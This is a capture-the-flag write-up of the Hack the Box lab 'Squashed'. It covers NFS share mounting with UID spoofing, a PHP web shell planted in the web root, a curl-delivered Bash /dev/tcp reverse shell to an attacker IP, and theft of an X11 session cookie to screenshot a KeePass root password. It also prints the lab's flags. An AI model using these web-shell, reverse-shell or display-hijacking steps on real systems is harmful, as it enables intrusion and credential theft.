---
title: Squashed (Hack the Box)
author: Robin Goyal
date: 2024-01-13
categories: [Cybersecurity, Writeups]
tags: []
image:
  src: https://labs.hackthebox.com/storage/avatars/2b64823934eb46f2c531a0b650a03d60.png
---

![](/assets/img/htb-banner.png)

Squashed is an Easy Difficulty Linux machine that features a combination of both identifying and leveraging misconfigurations in NFS shares through impersonating users. Additionally, the box incorporates the enumeration of an X11 display into the privilege escalation by having the attacker take a screenshot of the current Desktop.[^htb-link]

<img src="{{ page.image.src }}" style="margin-right: 40px; margin-left: 20px; zoom: 50%;" align=left />    	

### {{ page.title }}

**Difficulty**: `easy`

**User Flag**: `4257b3487364445f694671a325e1bc1b`

**Root Flag**: `2425336cfaf084e96c3e6b21804e3ac8`

<br>
<hr>
<br>


## Enumeration

Initial full TCP port scan revealed a couple of open ports: 22, 80, 111, 2049, 42103, 49913, 51557, 53179. 

```bash
#nmap -p 22,80,111,2049,42103,49913,51557,53179 -sC -sV -oN portscan.nmap 10.129.228.109                                                              [5/25]
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 19:58 EDT                                                                                     
Nmap scan report for 10.129.228. 109                                                                                                                            
Host is up (0.014s latency).                    
PORT      STATE SERVICE  VERSION                                                                                                                                 
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                  
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)                                 
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better                                                      
|_http-server-header: Apache/2.4.41 (Ubuntu)           
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:                                                                      
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs                                          
|   100003  3           2049/udp6  nfs                                          
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33051/tcp6  mountd
|   100005  1,2,3      38234/udp6  mountd
|   100005  1,2,3      48240/udp   mountd
|   100005  1,2,3      51557/tcp   mountd
|   100021  1,3,4      40254/udp6  nlockmgr
|   100021  1,3,4      42103/tcp   nlockmgr
|   100021  1,3,4      44801/udp   nlockmgr
|   100021  1,3,4      46191/tcp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227) 
42103/tcp open  nlockmgr 1-4 (RPC #100021)
49913/tcp open  mountd   1-3 (RPC #100005)
51557/tcp open  mountd   1-3 (RPC #100005)
53179/tcp open  mountd   1-3 (RPC #100005)
```

## Initial Foothold

Starting off by checking if the NFS server is exposing some shares that can be mounted.

### NFS

```bash
showmount -e 10.129.50.186
Export list for 10.129.50.186:
/home/ross    *
/var/www/html *
```

There are two shares exposed on the NFS server that we can mount. Creating some directories to mount these shares. 

```bash
mkdir ross
mount -t nfs 10.129.50.186:/home/ross ./ross
mkdir html
mount -t nfs 10.129.50.186:/var/www/html ./html
```

The privileges of the two directories

```bash
ls -la html/
ls: cannot access 'html/.': Permission denied
ls: cannot access 'html/..': Permission denied
ls: cannot access 'html/.htaccess': Permission denied
ls: cannot access 'html/index.html': Permission denied
ls: cannot access 'html/images': Permission denied
ls: cannot access 'html/css': Permission denied
ls: cannot access 'html/js': Permission denied
total 0
d????????? ? ? ? ?            ? .
d????????? ? ? ? ?            ? ..
?????????? ? ? ? ?            ? css
?????????? ? ? ? ?            ? .htaccess
?????????? ? ? ? ?            ? images
?????????? ? ? ? ?            ? index.html
?????????? ? ? ? ?            ? js
```

```bash
ls -ld ross/ html/
drwxr-xr--  5 2017 www-data 4096 Jan 13 14:05 html/
drwxr-xr-x 14 1001 scanner  4096 Jan 13 13:46 ross/
```

The reason that our current user can't list the permissions of the html directory is because it is owned by user with uid 2017 and group www-data. Since the current user has none of those permissions, it can only list the contents of the directory from `r--` of the world permissions but not extended data or write permissions. 

It is possible to create a user with that uid and be able to access the shares. 

```bash
useradd rosstemp -u 2017 -m -s /bin/bash
```

Now, 

```bash
ls -ld html/
drwxr-xr-- 5 rosstemp www-data 4096 Jan 13 14:30 html/

ls -la html/
total 52
drwxr-xr-- 5 rosstemp www-data  4096 Jan 13 14:30 .
drwxr-xr-x 1 root     root        90 Jan 13 14:05 ..
drwxr-xr-x 2 rosstemp www-data  4096 Jan 13 14:30 css
-rw-r--r-- 1 rosstemp www-data    44 Oct 21  2022 .htaccess
drwxr-xr-x 2 rosstemp www-data  4096 Jan 13 14:30 images
-rw-r----- 1 rosstemp www-data 32532 Jan 13 14:30 index.html
drwxr-xr-x 2 rosstemp www-data  4096 Jan 13 14:30 js
```

Betting on the html directory mapping to the contents that the web server is serving, we might be able to inject our own PHP or another language web shell. 

The .htaccess file provides a clue that the backend web server might be PHP. 

```bash
cat html/.htaccess
AddType application/x-httpd-php .htm .html
```

### Reverse Shell

Since our rosstemp user has write permissions to the directory, we can drop the following simple php webshell as shell.php.

```php
<?php system($_REQUEST['cmd']);?>
```

Curling the web server from the command line

```bash
echo '<?php system($_REQUEST["cmd"]);?>' >> shell.php

curl http://10.129.50.186/shell.php?cmd=whoami
alex
```

Let's generate a reverse shell. We can use a Bash TCP reverse shell while URL-encoding the key characters, specifically the `&` and spaces as that would break our command in the command line as well as web server parsing it as query parameters. 

```bash
curl 'http://10.129.50.186/shell.php?cmd=bash+-c+"bash+-i+>%26/dev/tcp/10.10.14.2/5555+0>%261"'
```

![](/assets/img/posts/htb-squashed/revshell.png)

With the reverse shell, let's upgrade our shell[^upgrade-reverse-shell] and perform some lateral or privilege escalation. 

## Privilege Escalation

**The privilege escalation vector was not intuitive to me and exposed me to new concepts that required me to take some hints.**

```bash
alex@squashed:/home/alex$ w
 20:16:14 up  1:29,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               18:46    1:29m  4.46s  0.02s /usr/libexec/gnome-session-binary --systemd --session=gnome
```
Ross is currently authenticated to the system in the `:0` display. The presence of .Xauthority or .xsession files might indicate that an X session display is configured where a user is currently logged in. 

> X is a portable network-transparent window system for managing a windows GUI. When it is paired with a display manager, it servers as a full-fledged GUI that can be used to run programs which might not run headlessly. 

When listing out Ross's home directory from the NFS share, there was an .Xauthority file. To be able to access that share, let's change the uid of the rosstemp user to be 1001 or create another rosstemp2 user with that uid. 

```bash
$useradd rosstemp2 -u 1001 -m -s /bin/bash
$ls -la . | grep .Xauthority 
-rw-------  1 rosstemp2 scanner   57 Jan 13 13:46 .Xauthority
$cat .Xauthority | base64
AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABDDlx2uTRvnlLzHZpCmJNi6
```

With the .Xauthority file's contents dumped as base64 (because the .Xauthority file is a binary data file and not ASCII), switch back to the shell as alex and save that base64 string as .Xauthority in alex's home directory. 

```bash
echo "AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABDDlx2uTRvnlLzHZpCmJNi6" | base64 -d > /home/alex/.Xauthority
```

With the .Xauthority file, prefix the commands with `XAUTHORITY=/home/alex/.Xauthority`, we can enumerate the X session. 

```bash
alex@squashed:/home/alex$ XAUTHORITY=/home/alex/.Xauthority xdpyinfo -display :0                                                                                                                                            [2760/3834]
name of display:    :0                                                                                                                                                                                                                 
version number:    11.0                                                                                                                                                                                                                
vendor string:    The X.Org Foundation                                                                                                                                                                                                 
vendor release number:    12013000                                                                                                                                                                                                     
X.Org version: 1.20.13                                                                                                                                                                                                                 
maximum request size:  16777212 bytes                                                                                                                                                                                                  
motion buffer size:  256                                                                                                                                                                                                               
bitmap unit, bit order, padding:    32, LSBFirst, 32                                                                                                                                                                                   
image byte order:    LSBFirst                                                                                                                                                                                                          
number of supported pixmap formats:    7                                                                                                                                                                                               
supported pixmap formats:                                                                                                                                                                                                              
    depth 1, bits_per_pixel 1, scanline_pad 32                                                                                                                                                                                         
    depth 4, bits_per_pixel 8, scanline_pad 32                                                                                                                                                                                         
    depth 8, bits_per_pixel 8, scanline_pad 32                                                                                                                                                                                         
    depth 15, bits_per_pixel 16, scanline_pad 32                                                                                                                                                                                       
    depth 16, bits_per_pixel 16, scanline_pad 32                                                                                                                                                                                       
    depth 24, bits_per_pixel 32, scanline_pad 32                                                                                                                                                                                       
    depth 32, bits_per_pixel 32, scanline_pad 32                                                                                                                                                                                       
keycode range:    minimum 8, maximum 255                                                                                                                                                                                               
focus:  window 0x1e00006, revert to PointerRoot                                                                                                                                                                                        
number of extensions:    28                   
```

The `xwininfo` command will display the open windows in the session. The root window has an open window to view a Keepass vault.

```bash
alex@squashed:/home/alex$ XAUTHORITY=/home/alex/.Xauthority xwininfo -root -tree -display :0                                                                                                    
xwininfo: Window id: 0x533 (the root window) (has no name)                                                         
                                                         
  Root window id: 0x533 (the root window) (has no name)
  Parent window id: 0x0 (none)                       
     26 children:                                     
     0x80000b "gnome-shell": ("gnome-shell" "Gnome-shell")  1x1+-200+-200  +-200+-200                              
        1 child:       
        0x80000c (has no name): ()  1x1+-1+-1  +-201+-201                                                          
     0x800021 (has no name): ()  802x575+-1+26  +-1+26
        1 child:                                      
        0x1e00006 "Passwords - KeePassXC": ("keepassxc" "keepassxc")  800x536+1+38  +0+64                          
           1 child:                                   
           0x1e000fe "Qt NET_WM User Time Window": ()  1x1+-1+-1  +-1+63                                           
     0x1e00008 "Qt Client Leader Window": ()  1x1+0+0  +0+0                                                        
     0x800017 (has no name): ()  1x1+-1+-1  +-1+-1 
     0x2000001 "keepassxc": ("keepassxc" "Keepassxc")  10x10+10+10  +10+10                                         
     0x1e00004 "Qt Selection Owner for keepassxc": ()  3x3+0+0  +0+0                                               
     0x1c00001 "evolution-alarm-notify": ("evolution-alarm-notify" "Evolution-alarm-notify")  10x10+10+10  +10+10  
     0x1600002 (has no name): ()  10x10+0+0  +0+0     
     0x1800001 "gsd-color": ("gsd-color" "Gsd-color")  10x10+10+10  +10+10                                         
     0x1600001 "gsd-xsettings": ("gsd-xsettings" "Gsd-xsettings")  10x10+10+10  +10+10                             
     0x1a00001 "gsd-wacom": ("gsd-wacom" "Gsd-wacom")  10x10+10+10  +10+10                                         
     0x1400001 "gsd-media-keys": ("gsd-media-keys" "Gsd-media-keys")  10x10+10+10  +10+10                          
     0x1200001 "gsd-power": ("gsd-power" "Gsd-power")  10x10+10+10  +10+10                                         
     0x1000001 "gsd-keyboard": ("gsd-keyboard" "Gsd-keyboard")  10x10+10+10  +10+10                                
     0xc00003 "ibus-xim": ()  1x1+0+0  +0+0           
```
 
Options explained: 

```
- root - select the main root window, not requiring me to select a sub-window with the mouse (which would be impossible with a remote shell)
- screen - makes sure the GetImage request goes to the root window
- silent - silence the typical bells that come with a screenshot
- display :0 - specifies the window to connect to
```

Taking a screenshot of the root window, we might be able to see the contents of the vault if it is in the forefront.

```bash
alex@squashed:/home/alex$ XAUTHORITY=/home/alex/.Xauthority xwd -root -screen -silent -display :0 >/tmp/screenshot.xwd
alex@squashed:/home/alex$ cd /tmp/        
alex@squashed:/tmp$ ls                                                                                             
screenshot.xwd
```

Transfer the screenshot to our VM, 

```bash
alex@squashed:/tmp$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.14.2 - - [13/Jan/2024 20:31:53] "GET /screenshot.xwd HTTP/1.1" 200 -
```

and convert it to a PNG. 

```bash
$ convert screenshot.xwd screenshot.png
```

![](/assets/img/posts/htb-squashed/root.png)

There is a password present for a user called root. Testing these out as root creds in the shell!

```bash
alex@squashed:/tmp$ su root
Password: 
root@squashed:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## Cleanup

Delete the user we created on our VM

```bash
userdel rosstemp
rm -r /home/rosstemp
```

## Reflection

### Useful Commands

**Take a screenshot of an X session window**: `XAUTHORITY=/home/alex/.Xauthority xwd -root -screen -silent -display :0 >/tmp/screenshot.xwd`

**Reverse TCP Bash shell through a curl command**: `curl http://10.129.50.186/shell.php?cmd=bash+-c+"bash+-i+>%26/dev/tcp/10.10.14.2/5555+0>%261"`

**Mount NFS share**: `mount -t nfs 10.129.50.186:/var/www/html ./html`

### Killchain Summary

1. Find exposed NFS shares and mount them creating users that match the uid of the shares
2. Write a PHP web shell to the root web directory in the /var/www/html exposed NFS share
3. Acquire shell as alex from a reverse shell Bash TCP command through the web shell
4. Take a screenshot of ross's authentication GUI session to view the contents of the Keepass vault and escalate privileges to root

### Misconfigurations

Some misconfigurations on this host that led us to have root access:
- all_squash not enabled on the NFS server which lets us map the uid's to have the same permissions on the directories as the user that owns them

### Summary of Exploits

No exploits used.

## Conclusion

I found the privilege escalation vector to be very unique and outside of my understanding so I had to Google a bit to get to the end result. Shoutout to 0xdf for this hslp. 

It shows that I still have a lot to learn about enumerating systems and realizing that users could be simulated to be logged in as well as. There is also a whole world of understanding display managers and these X11 servers/sessions. 

## References

[^htb-link]: <https://www.hackthebox.com/machines/squashed>
[^upgrade-reverse-shell]: <https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/>